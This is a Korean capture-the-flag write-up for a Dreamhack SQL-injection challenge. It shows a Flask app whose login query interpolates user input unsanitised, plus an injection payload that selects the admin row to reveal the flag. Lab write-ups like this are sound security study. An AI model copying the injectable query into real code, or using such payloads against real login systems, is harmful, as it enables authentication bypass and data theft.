# simple_sqli_chatgpt

## 개요
 - dreamhack simple_sqli_chatgpt 문제입니다.

## Preview
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/a21785bb-acbd-4673-af82-91253932042f)
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/fb7a073d-7d47-47aa-a5ee-fc4f0df8f0a6)

## Source
```
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100), userlevel integer);')
    db.execute(f'insert into users(userid, userpassword, userlevel) values ("guest", "guest", 0), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0);')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userlevel = request.form.get('userlevel')
        res = query_db(f"select * from users where userlevel='{userlevel}'")
        if res:
            userid = res[0]
            userlevel = res[2]
            print(userid, userlevel)
            if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)

```

## 취약점
 - 소스코드를 보면 userlevel을 유저의 입력값으로 데이터베이스 컬럼을 조회하는 구문을 확인할수 있습니다.
```
res = query_db(f"select * from users where userlevel='{userlevel}'")
```
 - 그리고 flag값을 받기위해선 userid == 'admin 이어야하고 userlevel이 0 이어야합니다.
```
if userid == 'admin' and userlevel == 0:
    return f'hello {userid} flag is {FLAG}'
```

## payload
```
0' and userid='admin' -- -
```

![image](https://github.com/ChCh0i/dreamhack/assets/108965611/97b4ce65-d78f-4793-a8d4-e55882d9aa94)
